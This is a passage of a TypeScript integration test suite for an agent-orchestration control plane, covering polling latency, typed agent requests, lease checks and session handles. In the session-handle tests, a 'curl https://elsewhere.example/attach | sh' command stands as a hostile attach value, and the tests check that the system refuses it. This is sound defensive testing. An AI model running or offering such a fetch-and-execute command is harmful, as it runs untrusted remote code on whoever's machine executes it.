  const pulled = await pullOnce(flaky, { backoffMs: 0 });
  assert.equal(pulled.replayed, true, 'the retry got the claim the timed-out call had already made');
  assert.equal(keys.length, 2);
  assert.equal(new Set(keys).size, 1, 'both attempts carried one idempotency key');
  // A server that answered is an answer, retried by nobody.
  let refusals = 0;
  await assert.rejects(pullOnce(async () => { refusals++; throw new Error('Worker permission required'); }, { backoffMs: 0 }), /Worker permission required/);
  assert.equal(refusals, 1);
  assert.ok(transportRetries >= 2);

  // Ready-to-claim, measured: the shipped pull loop (`runWorkerPull`) polls at its interval while
  // items are released under it, and each latency is the time from the item becoming ready to the
  // claim landing. The interval is scaled down so the measurement fits a test; what is measured is
  // that the loop claims within one interval of the work appearing, which is the property the
  // published interval then bounds.
  const pollMs = 100;
  const latencies: number[] = [];
  for (let index = 0; index < 10; index++) {
    const actor = index % 2 ? worker : otherWorker;
    const item = await engine.execute(operator, 'create', null, { title: `Polled ${index}`, plannedFiles: [`src/polled-${index}/`], criteria: [{ id: 'AC-1', text: 'Proven', proofs: [PROOF] }] }, randomUUID());
    // The loop is already polling when the item is released, exactly as an idle session is.
    const loop = runWorkerPull(() => engine.pullAssignment(actor, { work: item.id }, randomUUID()), { intervalMs: pollMs, maxPolls: 300 });
    await release(item);
    const readyAt = Date.now();
    const result = await loop;
    assert.ok(result.assigned, `${item.key} was handed to the polling worker`);
    assert.ok(result.polls >= 1, 'the assignment came from a poll, not from a dispatch');
    latencies.push(Math.max(0, Date.now() - readyAt));
    await engine.execute(actor, 'release', result.assigned!.id, { epoch: result.assigned!.lease!.epoch }, randomUUID());
  }
  const rank = (values: number[], percentile: number) => [...values].sort((a, b) => a - b)[Math.max(0, Math.ceil(values.length * percentile / 100) - 1)];
  const measuredP90 = rank(latencies, 90);
  assert.equal(latencies.length, 10);
  assert.ok(measuredP90 <= 4 * pollMs, `p90 ready-to-claim ${measuredP90}ms is within a few ${pollMs}ms polls`);
  // The same loop at the interval Graphyard ships: one interval, plus the service time just
  // measured above it. Both are inside the two-minute bound the criterion sets.
  const serviceMs = Math.max(0, measuredP90 - pollMs);
  assert.ok(workerPullIntervalMs <= 120_000, `the published poll interval ${workerPullIntervalMs}ms is inside the two-minute bound`);
  assert.ok(workerPullIntervalMs + serviceMs <= 120_000, `p90 ready-to-claim at the shipped interval, ${workerPullIntervalMs + serviceMs}ms, is inside two minutes`);

  // No central runtime-health tracking: the request body carries nothing but an optional host,
  // and the control plane consults no profile registry, credential inspection or session inventory.
  const idle = await engine.pullAssignment(worker, { work: 'GY-nothing-on-offer' }, randomUUID());
  assert.equal(idle.assigned, null);
  assert.equal(idle.offered, 0);
  assert.deepEqual(Object.keys(idle as object).sort(), ['assigned', 'at', 'offered', 'refused']);
});

// ---- AC-5: no language model in the critical path ---------------------------------------------

test('integration:no-llm-in-critical-path — a full ready-to-delivered cycle runs with the escalation handler disabled, and no executor step needs a language model', async () => {
  // The roles are declared per kind: judgment happens inside what an action starts, never in the
  // executor step that starts it. Four kinds name a judgment; the other five are mechanical.
  assert.deepEqual(Object.entries(nextActionLlmRoles).filter(([, role]) => role !== null).map(([kind]) => kind).sort(),
    ['dispatch', 'escalate', 'request-review', 'request-rework'].sort());
  assert.deepEqual([...mechanicalActionKinds].sort(), ['approve-scope', 'merge', 'reclaim', 'resync', 'verify-deployment'].sort());
  assert.deepEqual([...llmRoles].sort(), ['approve-decision', 'implement', 'produce-evidence', 'resolve-escalation', 'review']);
  // Every judgment the project names has exactly one action that starts it, and nothing else does.
  assert.deepEqual([...new Set(Object.values(nextActionLlmRoles))].filter(Boolean).sort(), ['approve-decision', 'implement', 'resolve-escalation', 'review'],
    'produce-evidence is the dispatch of a producer session, which the computed action names on the row');

  const item = await release(await created({ policy: { checks: ['test', 'typecheck'], review: true, deploySmoke: false } }));
  const mine = new Set([item.id]);
  await isolateQueue(mine);
  const log = emptyLog();
  const effects = fleetExecutor(executorA, 'host-1', log, mine);
  assert.equal(effects.handlers.escalate, undefined, 'this executor cannot resolve an escalation at all');
  assert.ok(!executorKinds(effects.handlers).includes('escalate'));
  // Not a configuration choice: a kind whose judgment happens in the step itself may never have a
  // handler, and the executor entry point refuses one that does (src/cli/executor.ts).
  assert.deepEqual([...executorRunnableKinds].sort(), ['approve-scope', 'dispatch', 'merge', 'reclaim', 'request-review', 'resync', 'verify-deployment'].sort());
  assert.match(judgmentInExecutorLoop({ ...effects.handlers, escalate: async () => 'resolved' })!, /^escalate is a judgment made in the step itself/);
  assert.match(judgmentInExecutorLoop({ 'request-rework': async () => 'reworked' })!, /^request-rework is a judgment made in the step itself/);

  await drain([effects], log, mine);
  const delivered = await reload(item);
  assert.equal(delivered.stage, 'done');
  assert.ok(delivered.delivery?.mergeSha);
  assert.ok(!log.executed.some(entry => entry.kind === 'escalate'), 'no escalation was needed to deliver');
  assert.ok(log.executed.some(entry => entry.key === item.key && entry.kind === 'merge'));
  // What the merge row records is the broker's own account of what it did. The executor declares
  // no merge of its own: the broker throws when it does not reach the provider, and only the
  // observation that follows turns a requested merge into a delivery.
  const mergeSettlement = [...(delivered.actionQueue?.history ?? []), ...(delivered.actionQueue?.actions ?? [])]
    .flatMap(entry => entry.kind === 'merge' ? entry.history : []).find(entry => entry.event === 'completed');
  assert.match(mergeSettlement!.reason, /merge requested; Graphyard will mark Done only after observing the merge/);

  // An item that does raise an escalation stalls at that row rather than being resolved by the
  // loop: the escalation handler is outside the critical path, not quietly automated inside it.
  let escalated = await engine.execute(worker, 'claim', (await release(await created())).id, {}, randomUUID());
  escalated = await engine.execute(worker, 'request', escalated.id, { type: 'blocker', epoch: escalated.epoch, reason: 'The provider account has no quota left' }, randomUUID());
  assert.equal(escalated.nextAction!.kind, 'escalate');
  const before = log.executed.length;
  const tick = await runExecutorTick({ id: executorA.id, host: 'host-1' }, effects);
  assert.equal(tick.result, 'idle');
  assert.equal(tick.reason, 'the queue has no action this executor can run');
  assert.equal(log.executed.length, before, 'the executor claimed nothing it cannot run');
  assert.equal((await reload(escalated)).actionQueue!.actions[0].state, 'pending', 'the escalate row waits for a judgment nobody mechanised');
  await engine.execute(operator, 'unblock', escalated.id, { reason: 'Quota restored' }, randomUUID());
});

// ---- AC-7: typed agent requests ---------------------------------------------------------------

test('integration:typed-agent-requests — an agent that needs something records a typed request, names its decider and exits without holding its lease, and master status shows it with how long it has waited', async () => {
  // Every type names exactly one decider, from the four the project allows.
  assert.deepEqual([...agentRequestTypes], ['scope-request', 'decision', 'blocker', 'note', 'escalation']);
  assert.deepEqual(agentRequestTypes.map(type => deciderFor('GY-9', { type, action: 'rework' }).kind), ['rule', 'approver', 'follow-up', 'rule', 'approver']);
  for (const type of agentRequestTypes) {
    const decider = deciderFor('GY-9', { type, action: 'rework' });
    assert.ok(decider.who.length > 0, `${type} names who decides it`);
    assert.equal(['rule', 'approver', 'follow-up', 'human'].includes(decider.kind), true);
  }
  // Only one of the three human-only decisions reaches a person, whatever the type.
  for (const humanDecision of humanDecisions) assert.equal(deciderFor('GY-9', { type: 'decision', humanDecision }).kind, 'human');

  // A worker that needs files outside plannedFiles records the ask and gives the item back. Its
  // decider is a deterministic rule, so the control plane applies it in the same transaction:
  // the ask is answered before the session has finished exiting.
  let item = await engine.execute(worker, 'claim', (await release(await created({ plannedFiles: ['src/'], criteria: [{ id: 'AC-1', text: 'Update the architecture guide for the new contract', proofs: [PROOF] }] }))).id, {}, randomUUID());
  const epoch = item.epoch;
  item = await engine.execute(worker, 'request', item.id, { type: 'scope-request', epoch, paths: ['docs/architecture.md'], reason: 'the contract this item changes is described in the architecture guide' }, randomUUID());
  assert.equal(item.lease, null, 'the attempt ended in the same transaction; nothing waits at a prompt');
  assert.equal(item.pipeline!.attempts.at(-1)!.end, 'released');
  const scope = item.agentRequests!.at(-1)!;
  assert.equal(scope.type, 'scope-request');
  assert.equal(scope.releasedLease, true);
  assert.deepEqual(scope.decider, { kind: 'rule', who: 'the additive planned-files widening rule', command: `graphyard master scope ${item.key}` });
  assert.equal(scope.state, 'resolved', 'the rule that decides it ran here, so nothing is left waiting');
  assert.equal(item.scopeDecision!.state, 'approved');
  assert.match(scope.resolution!, /^approved: additive scope the item already implies/);
  assert.ok(item.plannedFiles.includes('docs/architecture.md'), 'the widening the item already implied was applied');
  assert.equal(item.scopeRequest, null);

  // A request the rule cannot approve keeps the refusal as the item's blocker, so the ready gate
  // holds it and the control plane names an escalation rather than leaving it silently open.
  let wider = await engine.execute(worker, 'claim', (await release(await created())).id, {}, randomUUID());
  wider = await engine.execute(worker, 'request', wider.id, { type: 'scope-request', epoch: wider.epoch, paths: ['deploy/helm/'], reason: 'the chart needs the same value' }, randomUUID());
  assert.equal(wider.scopeDecision!.state, 'refused');
  assert.match(wider.blocker!, /outside what this item's own criteria and the repository's documentation rule imply/);
  assert.equal(wider.nextAction!.kind, 'escalate');
  assert.equal(wider.agentRequests!.at(-1)!.state, 'resolved');
  assert.ok(!wider.plannedFiles.includes('deploy/helm/'));
  await engine.execute(operator, 'unblock', wider.id, { reason: 'Operator decided the chart is out of scope for this item' }, randomUUID());

  // A decision request names the action an independent approver must approve.
  let decided = await engine.execute(worker, 'claim', (await release(await created())).id, {}, randomUUID());
  decided = await engine.execute(worker, 'request', decided.id, { type: 'decision', epoch: decided.epoch, action: 'rework', reason: 'the finding needs a second head, which only an approved rework opens' }, randomUUID());
  const decision = openAgentRequests(decided, new Date())[0];
  assert.equal(decision.decider.kind, 'approver');
  assert.match(decision.decider.command!, /master decide GY-\d+ rework REASON, then graphyard master approver/);
  assert.equal(decided.lease, null);
  // Master status shows the open request with its decider and how long it has waited, addressed
  // to an agent; and the control plane names the escalation that leaves the executor loop for it.
  const snapshot = { work: await store.list(), now: new Date(Date.now() + 90_000).toISOString() };
  const line = agentRequestAttention(snapshot).find(entry => entry.subject === decided.key)!;
  assert.match(line.text, /recorded a decision on GY-\d+ 1.5 min ago and released its lease/);
  assert.match(line.text, /decided by an independent approver agent/);
  assert.deepEqual([line.role, line.human, line.humanOnly, line.approvedBy], ['master', false, null, 'approver']);
  assert.equal(line.next, decision.decider.command);
  assert.ok(agentRequestReport(snapshot).some(entry => entry.key === decided.key && entry.waitedMs >= 90_000));
  assert.ok(actionReport(snapshot).next.some(entry => entry.key === decided.key && entry.kind === 'escalate'));

  // A blocker names a tracked follow-up item and still sets the blocker the gates read.
  let blocked = await engine.execute(worker, 'claim', (await release(await created())).id, {}, randomUUID());
  blocked = await engine.execute(worker, 'request', blocked.id, { type: 'blocker', epoch: blocked.epoch, reason: 'the deployment provider is refusing every token' }, randomUUID());
  assert.equal(openAgentRequests(blocked, new Date())[0].decider.kind, 'follow-up');
  assert.equal(blocked.blocker, 'the deployment provider is refusing every token');
  assert.equal(blocked.lease, null);

  // A note is a record, not a hand-off: it keeps the lease and asks nobody for anything.
  let noted = await engine.execute(worker, 'claim', (await release(await created())).id, {}, randomUUID());
  noted = await engine.execute(worker, 'request', noted.id, { type: 'note', epoch: noted.epoch, reason: 'the third fixture is the slow one; it dominates the suite' }, randomUUID());
  assert.ok(noted.lease, 'a note does not end the attempt');
  assert.equal(openAgentRequests(noted, new Date())[0].decider.kind, 'rule');

  // A human-only decision is the operator's, and says which of the three it is.
  let money = await engine.execute(worker, 'claim', (await release(await created())).id, {}, randomUUID());
  money = await engine.execute(worker, 'request', money.id, { type: 'escalation', epoch: money.epoch, trigger: 'security-concern', humanDecision: 'spending-money-or-accounts', reason: 'finishing this needs a paid account with the provider' }, randomUUID());
  const human = openAgentRequests(money, new Date())[0];
  assert.equal(human.decider.kind, 'human');
  assert.match(human.decider.who, /spending money or accounts/);
  assert.equal(money.escalation!.trigger, 'security-concern');
  const humanLine = agentRequestAttention({ work: await store.list(), now: new Date().toISOString() }).find(entry => entry.subject === money.key)!;
  assert.deepEqual([humanLine.role, humanLine.human, humanLine.humanOnly], ['human', true, 'spending money or opening third-party accounts']);

  // A request from an attempt that ended is asked afresh: the next claim closes it.
  await engine.execute(worker, 'release', noted.id, { epoch: noted.epoch }, randomUUID());
  const reclaimed = await engine.execute(otherWorker, 'claim', noted.id, {}, randomUUID());
  assert.deepEqual(openAgentRequests(reclaimed, new Date()), [], 'a stale ask never looks like a live one');
  assert.equal(reclaimed.agentRequests!.at(-1)!.state, 'resolved');
  await engine.execute(otherWorker, 'release', reclaimed.id, { epoch: reclaimed.epoch }, randomUUID());

  // A request is closed by the party its record names, and by nobody else. Without that rule a
  // session could record a request for an independent approver or the human operator and then
  // resolve it itself, and master status would stop showing the very thing it exists to surface.
  await assert.rejects(engine.execute(worker, 'request', decided.id, { type: 'note', resolve: decision.id, reason: 'I approve my own request' }, randomUUID()),
    /agent-a recorded this decision; it is decided by an independent approver agent, never by the session that asked/);
  await assert.rejects(engine.execute(otherWorker, 'request', decided.id, { type: 'note', resolve: decision.id, reason: 'another worker closes it' }, randomUUID()),
    /decided by an independent approver agent; a worker credential cannot close it/);
  await assert.rejects(engine.execute(executorA, 'request', decided.id, { type: 'note', resolve: decision.id, reason: 'the loop closes it' }, randomUUID()),
    /a coordinator credential cannot close it/);
  assert.equal(requestResolutionRefusal({ type: 'escalation', requestedBy: 'agent-a', decider: deciderFor('GY-9', { type: 'escalation' }) }, { id: 'operator', role: 'admin' }), null);
  assert.equal(requestResolutionRefusal({ type: 'blocker', requestedBy: 'agent-a', decider: deciderFor('GY-9', { type: 'blocker' }) }, { id: 'master', role: 'coordinator' }), null,
    'a blocker names a tracked follow-up item, which the loop opens');
  assert.equal(requestResolutionRefusal({ type: 'note', requestedBy: 'agent-a', decider: deciderFor('GY-9', { type: 'note' }) }, { id: 'agent-a', role: 'worker' }), null,
    'a note decides nothing, so its author closes its own record');
  // The party the record does name closes it, with the reason on the record.
  const answered = await engine.execute(operator, 'request', decided.id, { type: 'note', resolve: decision.id, reason: 'the approver agent approved the rework' }, randomUUID());
  assert.deepEqual(openAgentRequests(answered, new Date()), []);
  assert.equal(answered.agentRequests!.find(entry => entry.id === decision.id)!.resolution, 'the approver agent approved the rework');

  // Recording a typed request is the same write as the command it replaces, so it needs the same
  // authority: the live lease of the attempt that is asking. Without this rule any worker or
  // producer credential with no assignment could set the blocker that holds the ready gate, or
  // raise the escalation that fences every in-flight merge, on any item in the graph.
  assert.deepEqual([...leaseHeldRequestTypes].sort(), ['blocker', 'decision', 'escalation', 'scope-request']);
  const unrelated = await release(await created());
  for (const type of leaseHeldRequestTypes) {
    const body: Record<string, unknown> = { type, reason: 'no lease on this item' };
    if (type === 'scope-request') body.paths = ['deploy/'];
    if (type === 'decision') body.action = 'rework';
    if (type === 'escalation') body.trigger = 'security-concern';
    for (const actor of [otherWorker, producer]) {
      await assert.rejects(engine.execute(actor, 'request', unrelated.id, body, randomUUID()),
        new RegExp(`A ${type} names the attempt epoch that is asking`), `${actor.role} cannot record a lease-less ${type}`);
    }
    // Naming an epoch it does not hold is refused by the lease check itself.
    await assert.rejects(engine.execute(otherWorker, 'request', unrelated.id, { ...body, epoch: 1 }, randomUUID()), /lease|epoch/i);
  }
  const untouched = await reload(unrelated);
  assert.equal(untouched.blocker, null, 'no blocker was set by a credential holding nothing');
  assert.equal(untouched.escalation ?? null, null, 'no escalation was raised by a credential holding nothing');
  assert.deepEqual(untouched.agentRequests ?? [], [], 'nothing was recorded at all');
  // A note moves nothing a gate reads, so a producer session with no lease may still record one.
  const noted2 = await engine.execute(producer, 'request', unrelated.id, { type: 'note', reason: 'the acceptance fixture needs a wider timeout on this host' }, randomUUID());
  assert.equal(openAgentRequests(noted2, new Date())[0].requestedBy, producer.id);
  assert.equal(noted2.blocker, null);

  // A session that ends waiting on input instead of recording one of these is recorded as failed
  // with that reason, and the record names the request it should have made.
  // Only one assignment may be held by this worker, so the cycle's observation is unambiguous.
  for (const open of await store.list()) {
    if (open.stage === 'done' || open.lease?.owner !== worker.id) continue;
    await engine.execute(worker, 'release', open.id, { epoch: open.lease.epoch }, randomUUID());
  }
  let waiting = await engine.execute(worker, 'claim', (await release(await created())).id, {}, randomUUID());
  waiting = await reload(waiting);
  const config = masterConfigSchema.parse({ version: 1, url: 'https://graphyard.example', credentialFile: '/outside/master.token', cliPath: '/outside/graphyard.mjs', repository: 'owner/project', baseBranch: 'main', githubAppId: 1234, hostId: 'host-1', masterAgentName: 'm', workers: [{ name: 'claude-worker', principal: worker.id, agentName: 'work-claude', mode: 'launch', kind: 'claude', credentialFile: '/outside/worker.token', approvals: 'auto' }] });
  const state = emptyDaemonState(config);
  const sessions: unknown[] = [];
  const effects: DaemonEffects = {
    closeSession: () => {}, dispatch: async () => ({}), requestProof: () => {}, merge: async () => ({}),
    observeDeployment: async () => ({ source: 'unavailable', sha: null, at: new Date().toISOString(), reason: 'not configured', deployed: [], pending: [] }),
    recordDeployment: async () => ({}), requestSmoke: () => {},
    agents: () => [{ name: 'work-claude', pane_id: 'pane-9', agent_status: 'blocked' } as any],
    credentials: async () => ({ 'claude-worker': { available: true, reason: null } }),
    recordSession: async (item, handle) => { sessions.push(handle); return engine.execute(executorA, 'session', item.id, handle, randomUUID()); },
    snapshot: async () => ({ work: await store.list(), now: new Date().toISOString() }),
    persist: async () => {},
  };
  const cycle = await runCycle(config, state, effects);
  const failure = cycle.actions.find(action => action.kind === 'session' && action.work === waiting.key);
  assert.ok(failure, `the cycle recorded a session failure for ${waiting.key}; it recorded ${JSON.stringify(cycle.actions.map(action => [action.kind, action.work, action.state]))}`);
  assert.equal(failure!.state, 'failed');
  assert.match(failure!.detail, /is waiting on input \(Herdr reports it blocked\)/);
  assert.match(failure!.detail, /records a typed request and exits — POST \/api\/work\/GY-\d+\/request with a type of scope-request, decision, blocker, note or escalation — which names its decider and frees the item/);
  await engine.execute(worker, 'release', waiting.id, { epoch: waiting.epoch }, randomUUID());
});

test('integration:typed-agent-requests — the bound on recorded requests retires resolved ones and never evicts an open ask', async () => {
  // An open decision request, recorded under the live lease of the attempt that asked, and left
  // for its approver. Its only durable effect is the record itself: unlike a blocker, an
  // escalation or a scope ask, nothing else on the item carries it, so losing the record loses
  // both the ask and the escalation the control plane raises from it.
  let item = await engine.execute(worker, 'claim', (await release(await created())).id, {}, randomUUID());
  item = await engine.execute(worker, 'request', item.id, { type: 'decision', epoch: item.epoch, action: 'rework', reason: 'the finding needs a second head, which only an approved rework opens' }, randomUUID());
  const ask = openAgentRequests(item, new Date())[0];
  assert.equal(item.lease, null, 'and the attempt ended, so the ask is not held by a session');

  // A note needs no lease, so any credential that reaches the item may record one. Trimming the
  // oldest entries to bound the list would therefore be a way to remove somebody else's ask:
  // enough notes and the open request falls off the end. The bound retires resolved requests
  // first — oldest first — and never evicts an open one, exactly as `sessions.ts::bounded` does
  // for handles, so the list stays bounded without anybody being able to silence a decision.
  for (let index = 0; index < agentRequestLimit + 10; index++) {
    item = await engine.execute(producer, 'request', item.id, { type: 'note', reason: `fixture ${index} is the slow one` }, randomUUID());
  }
  assert.equal(item.agentRequests!.length, agentRequestLimit, 'the list stays bounded');
  assert.ok(item.agentRequests!.some(entry => entry.id === ask.id), 'the open decision survived every one of them');
  assert.equal(openAgentRequests(item, new Date()).filter(entry => entry.type === 'decision').length, 1);
  assert.equal(item.nextAction!.kind, 'escalate', 'so the control plane still names the escalation the ask raises');
  assert.equal(inputs(item).trigger, 'decision');
  // The notes themselves are what the bound retired: resolved entries, oldest first.
  const resolvedNote = item.agentRequests!.find(entry => entry.type === 'note')!;
  const closed = await engine.execute(producer, 'request', item.id, { type: 'note', resolve: resolvedNote.id, reason: 'a note is closed by its author' }, randomUUID());
  assert.equal(closed.agentRequests!.find(entry => entry.id === resolvedNote.id)!.state, 'resolved');
  const bounded = await engine.execute(producer, 'request', closed.id, { type: 'note', reason: 'one more, which retires a resolved entry rather than the ask' }, randomUUID());
  assert.ok(bounded.agentRequests!.some(entry => entry.id === ask.id));
  assert.ok(!bounded.agentRequests!.some(entry => entry.id === resolvedNote.id), 'the resolved note is the one that made room');
});

// ---- AC-8: session handles --------------------------------------------------------------------

test('integration:session-handles-visible — every launched session records a durable handle on the item, and master status and the dashboard show what it is working on and how to attach to it', async () => {
  let item = await engine.execute(worker, 'claim', (await release(await created())).id, {}, randomUUID());
  const handle = { id: `${worker.id}:${item.epoch}`, kind: 'implementation' as const, epoch: item.epoch, runtime: 'claude', host: 'vishrog', workspace: 'wE', tab: 'tab-17', pane: 'pane-42', attach: 'herdr pane attach pane-42 --workspace wE', transcript: '/home/agent/.claude/transcripts/gy-87.jsonl', subject: `${item.key}: the inverted loop`, state: 'running' as const };
  item = await engine.execute(worker, 'session', item.id, handle, randomUUID());
  const recorded = item.sessions![0];
  assert.deepEqual([recorded.runtime, recorded.host, recorded.workspace, recorded.tab, recorded.pane, recorded.transcript], ['claude', 'vishrog', 'wE', 'tab-17', 'pane-42', '/home/agent/.claude/transcripts/gy-87.jsonl']);
  assert.equal(recorded.state, 'running');
  assert.equal(attachCommand(recorded), 'herdr pane attach pane-42 --workspace wE', 'a running session is attached to directly');

  // A reviewer or producer session holds no lease and records its handle under its own identity.
  const reviewerHandle = { id: 'review-request-1', kind: 'review' as const, runtime: 'cursor', host: 'host-2', pane: 'pane-7', attach: 'herdr pane attach pane-7', subject: `${item.key}: review head aaaaaaaaaaaa`, state: 'running' as const };
  item = await engine.execute(executorA, 'session', item.id, reviewerHandle, randomUUID());
  assert.equal(item.sessions!.length, 2);
  assert.equal(item.sessions![1].principal, executorA.id);
  await assert.rejects(engine.execute(worker, 'session', item.id, reviewerHandle, randomUUID()), /records its handle under its assignment epoch/);

  // The attach command on a handle is an instruction an operator runs, so an existing handle
  // belongs to the session it names, its launcher, or an admin. A producer credential — these
  // live on CI runners — can neither mark a running worker session finished nor replace what
  // somebody is about to run.
  await assert.rejects(engine.execute(producer, 'session', item.id, { ...handle, epoch: undefined, state: 'finished' as const, outcome: 'not mine to end' }, randomUUID()),
    new RegExp(`Session handle ${handle.id} belongs to ${worker.id}`));
  await assert.rejects(engine.execute(producer, 'session', item.id, { ...reviewerHandle, attach: 'curl https://elsewhere.example/attach | sh' }, randomUUID()),
    new RegExp(`Session handle review-request-1 belongs to ${executorA.id}`));
  const untouched = (await reload(item)).sessions!;
  assert.equal(untouched.find(entry => entry.id === handle.id)!.state, 'running', 'nothing was ended by a credential the handle does not name');
  assert.equal(untouched.find(entry => entry.id === reviewerHandle.id)!.attach, 'herdr pane attach pane-7');
  // A launcher names whose session it started, and that session — and only it — fills in what the
  // launcher could not know. Nobody below a coordinator may name another principal's session.
  const proofHandle = { id: 'proof-request-1', kind: 'proof' as const, principal: producer.id, runtime: 'claude', host: 'host-3', pane: 'pane-8', attach: 'herdr pane attach pane-8', subject: `${item.key}: integration proofs`, state: 'running' as const };
  item = await engine.execute(executorA, 'session', item.id, proofHandle, randomUUID());
  assert.equal(item.sessions!.find(entry => entry.id === proofHandle.id)!.principal, producer.id);
  await assert.rejects(engine.execute(producer, 'session', item.id, { ...proofHandle, id: 'proof-request-2', principal: executorA.id }, randomUUID()),
    /Only a coordinator or an admin records a handle on behalf of the session it launched/);
  item = await engine.execute(producer, 'session', item.id, { ...proofHandle, tab: 'tab-3', transcript: '/home/producer/.claude/proofs.jsonl' }, randomUUID());
  const proofSession = item.sessions!.find(entry => entry.id === proofHandle.id)!;
  assert.deepEqual([proofSession.tab, proofSession.transcript, proofSession.principal], ['tab-3', '/home/producer/.claude/proofs.jsonl', producer.id],
    'the session the launcher named added what only it knew, onto the same record');

  // Creating a handle is the launch authority, not something any credential that reaches the item
  // has. A producer token — these live on CI runners — cannot squat the predictable id of a
  // session about to be launched, which would otherwise fix the ownership on itself and leave the
  // real session unable to record its own tab and transcript.
  await assert.rejects(engine.execute(producer, 'session', item.id, { id: `${otherWorker.id}:${item.epoch + 1}`, kind: 'implementation' as const, runtime: 'claude', host: 'host-5', attach: 'curl https://elsewhere.example/attach | sh', subject: `${item.key}: squatted before the launcher records it`, state: 'running' as const }, randomUUID()),
    /has no live dispatch request whose session could record one/);
  assert.ok(!(await reload(item)).sessions!.some(entry => entry.id === `${otherWorker.id}:${item.epoch + 1}`));

  // And the bound on the list is not a way to evict somebody else's handle either: a launcher may
  // record more sessions than the list keeps, and the running one an operator is about to attach
  // to survives all of them — only finished handles are retired to make room.
  for (let index = 0; index < sessionHandleLimit + 5; index++)
    item = await engine.execute(executorA, 'session', item.id, { id: `sweep-${index}`, kind: 'coordination' as const, runtime: 'claude', host: 'host-4', subject: `${item.key}: sweep ${index}`, state: index < 3 ? 'finished' as const : 'running' as const }, randomUUID());
  const survivors = (await reload(item)).sessions!;
  const worked = survivors.find(entry => entry.id === handle.id)!;
  assert.equal(worked.state, 'running', 'the worker session is still there');
  assert.equal(attachCommand(worked), 'herdr pane attach pane-42 --workspace wE', 'with the command that attaches to it');
  assert.ok(!survivors.some(entry => entry.id === 'sweep-0'), 'a finished handle is what makes room');
  assert.ok(survivors.every(entry => entry.state === 'running'), 'and nothing running was retired');

  // Master status reports each running session with what it works on and the command that attaches.
  const snapshot = { work: await store.list(), now: new Date().toISOString() };
  const report = sessionReport(snapshot);
  const running = report.running.find(entry => entry.id === handle.id && entry.key === item.key)!;
  assert.equal(running.subject, `${item.key}: the inverted loop`);
  assert.equal(running.attach, 'herdr pane attach pane-42 --workspace wE');
  assert.equal(running.key, item.key);
  assert.ok(runningSessions(snapshot.work, new Date()).length >= 2);

  // A finished session keeps its handle and links its transcript, so its work stays readable.
  item = await engine.execute(worker, 'session', item.id, { ...handle, state: 'finished', outcome: 'submitted PR 41' }, randomUUID());
  const finished = sessionSummary(item, new Date()).find(entry => entry.id === handle.id)!;
  assert.equal(finished.state, 'finished');
  assert.ok(finished.endedAt);
  assert.equal(finished.outcome, 'submitted PR 41');
  assert.equal(finished.attach, 'vishrog:/home/agent/.claude/transcripts/gy-87.jsonl', 'a finished session links its transcript');
  assert.equal(attachCommand({ state: 'finished', attach: null, transcript: null, host: 'h' }), 'no attach command and no transcript were recorded for this session');
  assert.equal(attachCommand({ state: 'running', attach: null, transcript: null, host: 'h' }), 'no attach command and no transcript were recorded for this session');
  assert.ok(sessionReport({ work: await store.list(), now: new Date().toISOString() }).finished.some(entry => entry.id === handle.id && entry.key === item.key));

  // The dashboard drawer shows the same facts: the running session, its subject and its attach
  // command, and the typed action the control plane computed for the item.
  const current = await reload(item);
  const dashboard: any = {
    token: '', work: snapshot.work, status: { actor: { role: 'admin' }, repository: 'owner/project', baseBranch: 'main' }, error: '', connected: true, lastUpdated: null,
    view: 'overview', setView: () => {}, filter: null, setFilter: () => {}, selected: current.id, setSelected: () => {}, creating: false, setCreating: () => {},
    busy: false, setBusy: () => {}, observedAt: Date.now(), jobs: [], query: '', setQuery: () => {}, operatorAgents: [], events: [], operatorAgentsError: null,
    features: {}, editingRequirements: false, setEditingRequirements: () => {}, codexAvailable: false, queue: [], sessionEpoch: { current: 0 },
    api: async () => ({}), refresh: async () => {}, action: async () => {}, setError: () => {}, signOut: () => {},
  };
  const markup = renderToStaticMarkup(createElement(WorkDetails, { ...dashboard, item: current }));
  assert.ok(markup.includes('Sessions running now'), 'the drawer names the sessions running on this item');
  assert.ok(markup.includes('review head aaaaaaaa<') || markup.includes('review head aaaaaaaa '), 'the subject, its commit shown as 8 characters (GY-168)');
  assert.ok(!markup.includes('aaaaaaaaa'), 'never the longer hex run');
  assert.ok(markup.includes('herdr pane attach pane-7'), 'the drawer carries the command that attaches to a specific agent');
  assert.ok(markup.includes('/home/agent/.claude/transcripts/gy-87.jsonl'), 'a finished session links its transcript');
  assert.ok(markup.includes('Next action'), 'the drawer names the typed action the control plane computed');

  await engine.execute(worker, 'release', current.id, { epoch: current.epoch }, randomUUID());
});

test('integration:session-handles-visible — the reviewer and producer launchers record a handle for every session they start, and a session blocked at a prompt keeps the attach command somebody needs', async () => {
  // A launched reviewer or producer session used to exist only in this host's own ledger, which
  // is the relaying the handle exists to end. The dispatcher records one for each launch, from
  // the coordinates the launcher itself returns.
  const item = await submitted();
  await engine.observe(item.id, item.revision, observation(item, { reviews: [] }));
  const withRequests = await reload(item);
  assert.equal(withRequests.autoDispatch?.review, null, 'no reviewer is asked about a head whose proof has not run (GY-115)');
  assert.ok(withRequests.autoDispatch!.producers.length, 'the control plane asked for the proofs this head still owes');

  // A session the control plane itself asked for may record its own handle without holding a
  // lease: the live dispatch request is the item naming that session, and the handle is keyed on
  // it. Any other id from the same credential is refused, so handle creation stays the launch
  // authority it is — a producer token cannot mint handles on an item it merely reaches.
  const proofRequest = withRequests.autoDispatch!.producers[0];
  await engine.execute(producer, 'session', item.id, { id: proofRequest.id, kind: 'proof' as const, runtime: 'claude', host: 'vishrog', transcript: '/home/producer/.claude/proofs.jsonl', subject: `${item.key}: ${PROOF}`, state: 'running' as const }, randomUUID());
  await assert.rejects(engine.execute(producer, 'session', item.id, { id: `${proofRequest.id}-mine`, kind: 'proof' as const, runtime: 'claude', host: 'vishrog', subject: `${item.key}: a handle nothing asked for`, state: 'running' as const }, randomUUID()),
    /recorded by its launcher or by the session of a live dispatch request/);

  // The dispatcher `master run` builds, not one assembled here: the handle recording under test
  // is the wiring the shipped constructor returns, reached through the coordinator mutation the
  // daemon passes it. Only the outside world each launcher reaches is stubbed.
  const mutations: { path: string; body: any }[] = [];
  const production = dispatchEffects('/outside', () => fleetConfig, {
    snapshot: async () => ({ work: [await reload(item.id)], now: new Date().toISOString() }),
    mutate: async (path: string, body: unknown) => {
      mutations.push({ path, body });
      const [, id, command] = path.split('/');
      return engine.execute(executorA, command as any, id, body, randomUUID());
    },
    run: () => { throw new Error('this test reaches no launcher of its own'); },
  });
  assert.ok(production.recordSession, 'the dispatcher master run builds records a handle for what it launches');
  const handles: { key: string; handle: any }[] = [];
  const effects: DispatchEffects = {
